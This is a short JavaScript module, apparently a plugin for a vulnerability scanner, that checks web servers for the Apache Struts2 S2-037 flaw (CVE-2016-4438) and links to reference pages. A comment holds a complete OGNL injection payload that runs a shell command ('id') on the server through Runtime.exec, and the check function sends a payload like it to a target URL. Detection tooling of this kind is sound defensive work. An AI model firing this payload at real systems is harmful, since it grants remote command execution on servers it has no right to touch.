
module.exports={
	tags:"struts2,037,cve-2016-4438,20164438",
	des:"CVE-2016-4438,struts2 037漏洞检测",
	VulApps:["https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-037",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-037.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-037",
		"https://nvd.nist.gov/vuln/detail/CVE-2016-4438"],
	suport:g_szMyMsg,
	/*
%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=id
	*/
	doCheck:function (url,fnCbk)
	{
		var _t = this;
		var szOldUrl = url;
		url = url.substr(0, url.lastIndexOf('/') + 1) + encodeURIComponent(g_postData) + ":mtx.toString.json?ok=1";
		request(fnOptHeader({method: 'POST',uri: url}),
	    	function(e,r,b)
	    {
	    	fnDoBody(b,"s2-037",szOldUrl,null,function(o)
	    	{
	    		var r = {"url":szOldUrl,"send":url};
  				fnCbk(global.copyO2O(r,o),_t);
	    	});
	    });
	}
};